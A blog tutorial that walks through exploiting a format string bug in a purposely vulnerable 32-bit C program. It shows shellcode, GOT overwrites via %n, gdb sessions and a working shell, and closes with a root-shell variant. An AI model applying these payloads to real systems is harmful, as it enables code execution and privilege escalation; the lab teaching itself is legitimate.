---
title: Format Strings
date: 2016-11-01
draft: false
tags: [linux,exploit,32bit]
---
# Background
Any of us who have been around a while will most likely will have done some C
and will almost certainly come across the printf family of functions. Now
printf and its cousins have the special ability of accepting a string argument
which details how the data passed to it should be formatted, for example

{{< highlight c >}}
#include <stdio.h>

int main(int argc, char *argv[]) {
  if (argc == 2) {
    printf("Received string: %s", argv[1]);
  }
}
{{< / highlight >}}

Save the file as hello.c and compile with
```
  $ gcc -o hello hello.c
  $ ./hello mike
  Received string: mike
```

# Problem
you can see that we received the output expected. However if the programmer was
lazy (and most of us are) then because he was writing the string directly he may
have just done something like the following

{{< highlight c >}}
#include <stdio.h>

int main(int argc, char *argv[]) {
  if (argc == 2) {
    printf(argv[1]);
  }
}
{{< / highlight >}}

Compile and run as before and you see the string still gets printed
```
  $ ./hello mike
  mike
```
but now the programmer has passed the data into printf where the format string
is and printf will respond by parsing the input as a format string. The man page
for printf shows us the format string specifiers that we can use in format
strings, playaround with these and see what values you get back
```
  $ ./hello %d.%d
  -8856.-8832
```
Whoa! Where did those numbers came from? The answer is the stack our string said
to display the next two params as decimal values, since we didnt provide them
ourselves it pops them off the stack.

# Exploiting
This by its self can be used for data leakage by reading arbitrary data from the
stack you could leak sensitive data stored in memory, read stack canary values
to exploit buffer overflows in binaries where stack protection is enabled.

Today however we are going to use this to get a shell

## Setup
See my post on vagrant to setup a 32 bit virtual machine. Once ssh'd into that
machine save the following file to fmt.c

{{< highlight c >}}
/* fmt.c - sample program vulnerable to format string exploitation
 * 
 * $ gcc -o fmt fmt.c
 * $ execstack -s fmt # make stack executable
 */
#include <stdio.h>
#include <string.h>
 
int main(int argc, char *argv[]) {
    char b[128];
    strcpy(b, argv[1]);
    printf(b);
    printf("\n");
}

{{< / highlight >}}
Compile using
```
  $ gcc -fno-stack-protector -z execstack -o fmt fmt.c
```
You may see a warning about format strings but as long as you end up with a fmt
binary its all good. You also need to disable ASLR or else your shellcode will
move about on the stack each time you run the program. As root run
```
  $ echo 0 > /proc/sys/kernel/randomize_va_space
```

## Moving on
Now we hav2 our vulnerable binary lets test it
```
  $ ./fmt AAAA
  AAAA
```
looks good, now after reading the man pages for printf we found a couple of
interesting format specifiers
* %x lets us display a value as hex
* %n writes the amount of bytes written so far to the pointer that corresponds
  to this parameter

Jackpot! We can use this to write arbitrary data to a memory location that we
control!!!! More on that later, first we need to find out how to access the data
we supplied (so that we can provide our own address to write data to)
```
  $ ./fmt AAAA.%x.%x.%x.%x.%x.%x
  AAAA.bffff88b.1.b7ec71c9.41414141.2e78252e.252e7825
```
You can see from above that the 41414141 string is the 4th value on the stack
(0x41 hex is 65 decimal which is ascii A). Now up until now I have not mention
direct parameter access, this allows is to not have to specify all the %x's and
reference the 4th parameter as %4$x, see below
```
  $ ./fmt AAAA.%4\$x
  AAAA.41414141
```
You can now see that we are fetching our 4 A's of the stack (we have to escape
the $ as it is a special shell character). With the help of the %n specifier we
are going to write the address of some shellcode that we'll place on the stack
over the address of a function in the Global Offset Table (GOT for short) so to
sum up those 4 A's need to become the address of an entry in the GOT (and needs
to be called after the printf function call) and we need to write enough data so
that the %n value is equal to the address of our shell code.

## Shellcode 
I am not going to explain how I crafted this shellcode (I'll write another post
on how I did that). Run the below command in order to set up an environment
variable with our shell code in
```
  $ export EGG=$(python -c 'print "\x90" * 64 +
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
```
Here I'm using pythons ability to print hex chars to save the shellcode into the
EGG environment variable (see shellstorm.org for more examples of shellcode)

## Data Gathering
Now in order to exploit this vulnerability we need to gather a few pieces of
data

* Address of function in GOT to overwrite.

```
  $ objdump -R fmt

  fmt:     file format elf32-i386

  DYNAMIC RELOCATION RECORDS
  OFFSET   TYPE              VALUE 
  08049ff0 R_386_GLOB_DAT    __gmon_start__
  0804a000 R_386_JUMP_SLOT   printf
  0804a004 R_386_JUMP_SLOT   strcpy
  0804a008 R_386_JUMP_SLOT   __gmon_start__
  0804a00c R_386_JUMP_SLOT   __libc_start_main
  0804a010 R_386_JUMP_SLOT   putchar
```
we'll use the address of putchar as this gets called immediately after the
printf function so the address we are writing to is 0x0894a010 (this 32 bit / 4
byte address will become our A's in the payload string this means our format
string  will become $(python -c 'print "\x10\xa0\x04\x08"').%4\$n Which
translated means write the number 5 to the address 0x0804a010. Why the number 5?
Well we have written 4 bytes for the address (where the A's used to be) plus 1
period we used as a spacer. You may be thinking wait why is the address
backwards? Well this is because this machine is little endian (go and google!!).
Lets verify this in gdb!!

```
  $ gdb fmt
  gdb-peda$ run $(python -c 'print "\x10\xa0\x04\x08"').%4\$n
  [----------------------------------registers-----------------------------------]
  EAX: 0x5 
  EBX: 0xb7fd1ff4 --> 0x1a0d7c 
  ECX: 0x0 
  EDX: 0x0 
  ESI: 0x0 
  EDI: 0x0 
  EBP: 0xbffff698 --> 0x0 
  ESP: 0xbffff5fc --> 0x8048480 (<main+60>:   leave)
  EIP: 0x5
  EFLAGS: 0x210282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
  [-------------------------------------code-------------------------------------]
  Invalid $PC address: 0x5
  [------------------------------------stack-------------------------------------]
  0000| 0xbffff5fc --> 0x8048480 (<main+60>:  leave)
  0004| 0xbffff600 --> 0xa ('\n')
  0008| 0xbffff604 --> 0xbffff88a --> 0x804a010 --> 0x5 
  0012| 0xbffff608 --> 0x1 
  0016| 0xbffff60c --> 0xb7ec71c9 (test   eax,eax)
  0020| 0xbffff610 --> 0x804a010 --> 0x5 
  0024| 0xbffff614 (".%4$n")
  0028| 0xbffff618 --> 0x6e ('n')
  [------------------------------------------------------------------------------]
  Legend: code, data, rodata, value
  Stopped reason: SIGSEGV
  0x00000005 in ?? ()
  gdb-peda$ x/xw 0x0804a010
  0x804a010 <putchar@got.plt>:	0x00000005
  gdb-peda$ 
```
As you can see from above the program crashed and we have verified that the
value 5 has indeed been written to the address we wanted,

* We now need to know the address of our shellcode, this address can be anywhere
  in our NOP sled (the bunch of 0x90's we put at the beginning of our shellcode
  EGG environment variable)

```
  gdb-peda$ find 0x90909090 $esp $esp+2000
  Searching for '0x90909090' in range: 0xbffff5ac - 0xbffffd7c
  Found 16 results, display max 16 items:
  [stack] : 0xbffff8d8 --> 0x90909090 
  [stack] : 0xbffff8dc --> 0x90909090 
  [stack] : 0xbffff8e0 --> 0x90909090 
  [stack] : 0xbffff8e4 --> 0x90909090 
  [stack] : 0xbffff8e8 --> 0x90909090 
  [stack] : 0xbffff8ec --> 0x90909090 
  [stack] : 0xbffff8f0 --> 0x90909090 
  [stack] : 0xbffff8f4 --> 0x90909090 
  [stack] : 0xbffff8f8 --> 0x90909090 
  [stack] : 0xbffff8fc --> 0x90909090 
  [stack] : 0xbffff900 --> 0x90909090 
  [stack] : 0xbffff904 --> 0x90909090 
  [stack] : 0xbffff908 --> 0x90909090 
  [stack] : 0xbffff90c --> 0x90909090 
  [stack] : 0xbffff910 --> 0x90909090 
  [stack] : 0xbffff914 --> 0x90909090 
  
  gdb-peda$ x/20i 0xbffff910
     0xbffff910:	nop
     0xbffff911:	nop
     0xbffff912:	nop
     0xbffff913:	nop
     0xbffff914:	nop
     0xbffff915:	nop
     0xbffff916:	nop
     0xbffff917:	nop
     0xbffff918:	xor    eax,eax
     0xbffff91a:	push   eax
     0xbffff91b:	push   0x68732f2f
     0xbffff920:	push   0x6e69622f
     0xbffff925:	mov    ebx,esp
     0xbffff927:	push   eax
     0xbffff928:	push   ebx
     0xbffff929:	mov    ecx,esp
     0xbffff92b:	mov    al,0xb
     0xbffff92d:	int    0x80
     0xbffff92f:	add    BYTE PTR [ebp+0x53],dl
     0xbffff932:	inc    ebp
  gdb-peda$ 
```
Above we first used the find command to find 4 consecutive NOP's on the stack
(0x90's) and we found a list of possible addresses, we then chose an address
near to the bottom of the list and examined 20 instructions (x/20i) from that
address. This looks like the assembly for an execve syscall (the 0xb going in
the eax/al register and the int 0x80) so we found our address 0xbffff910.

We now have all the information we need to exploit this, to recap
* We are going to overwrite the putchar address 0x0804a010
* We are going to overwrite it with the address of our shell code where is
  0xbffff910

## Crafting the exploit
Armed with our information we are now going to tackle the writing the address of
our shellcode in two parts 

* Write the lower order bytes. From our shellcode address this means we first
  want to write the value f910 which in decimal is 63760 now we have to take
  into account that we have already written 5 bytes and we want to use one byte
  as a spacer so this leaves us with 63754 bytes and our format string becomes

```
  gdb-peda$ run $(python -c 'print "\x10\xa0\x04\x08"').%63754u.%4\$n

   [----------------------------------registers-----------------------------------]
  EAX: 0xf910 
  EBX: 0xb7fd1ff4 --> 0x1a0d7c 
  ECX: 0x0 
  EDX: 0x0 
  ESI: 0x0 
  EDI: 0x0 
  EBP: 0xbffff638 --> 0x0 
  ESP: 0xbffff59c --> 0x8048480 (<main+60>:	leave)
  EIP: 0xf910
  EFLAGS: 0x210282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
  [-------------------------------------code-------------------------------------]
  Invalid $PC address: 0xf910
  [------------------------------------stack-------------------------------------]
  0000| 0xbffff59c --> 0x8048480 (<main+60>:	leave)
  0004| 0xbffff5a0 --> 0xa ('\n')
  0008| 0xbffff5a4 --> 0xbffff826 --> 0x804a010 --> 0xf910 
  0012| 0xbffff5a8 --> 0x1 
  0016| 0xbffff5ac --> 0xb7ec71c9 (test   eax,eax)
  0020| 0xbffff5b0 --> 0x804a010 --> 0xf910 
  0024| 0xbffff5b4 (".%63754u.%4$n")
  0028| 0xbffff5b8 ("754u.%4$n")
  [------------------------------------------------------------------------------]
  Legend: code, data, rodata, value
  Stopped reason: SIGSEGV
  0x0000f910 in ?? ()
  gdb-peda$ x/xw 0x0804a010
  0x804a010 <putchar@got.plt>:	0x0000f910
  gdb-peda$ 
```
  As you can see we have written the lower order bytes to the address correctly

* We now need to tackle the higher order bytes, so now that means we need to
  write bfff - F910 more bytes to the higher order bytes. But this sum works out
  to a negative figure to fix this we use a trick we do 1bfff - f910 which
  equals c6ef or 50927 in decimal. We also have to adjust the address we are
  writing too by 2 bytes (as we are writing to the higher order bytes. Our input
  string now becomes

```
  gdb-peda$ run $(python -c 'print "\x10\xa0\x04\x08" + "\x12\xa0\x04\x08"').%63750u.%4\$n.%50925u.%5\$n
  
  $ ps
  [New process 8218]
  process 8218 is executing new program: /bin/ps
    PID TTY          TIME CMD
   7883 pts/0    00:00:00 bash
   8211 pts/0    00:00:00 gdb
   8213 pts/0    00:00:00 sh
   8218 pts/0    00:00:00 ps
```
  and we have a shell!! So what happened to our format string, well.....
1. We wrote 4 more bytes for the address of the higher order bytes so the %63754u
   part had to become %63750u
2. we added ,%50925u.%5\$n to the format string the 50925 part is the 50927
   bytes we calculated that we needed to write minus the 2 extra bytes we used
   for the spacers and now we have to write this value to the 5th parameter on
   the stack which is the address of the higher order bytes of the putchar
   address (0x0804a010), we don't need to inspect this address this time as we
   have a shell

Lets just attempt this exploit outside of gdb

```
  $ ./fmt $(python -c 'print "\x10\xa0\x04\x08" + "\x12\xa0\x04\x08"').%63750u.%4\$n.%50925u.%5\$n
  $ ps
    PID TTY          TIME CMD
   7883 pts/0    00:00:00 bash
   8211 pts/0    00:00:00 gdb
   8213 pts/0    00:00:00 sh
   8233 pts/0    00:00:00 sh
   8234 pts/0    00:00:00 ps
```
voila! We have a shell, now we could perhaps to further verify this if you set
the owner of the fmt bin to root (`chown root:root`) and set the suid bit
(`chmod +s fmt`) then you will be able to exploit this an get a root shell

Enjoy!!!
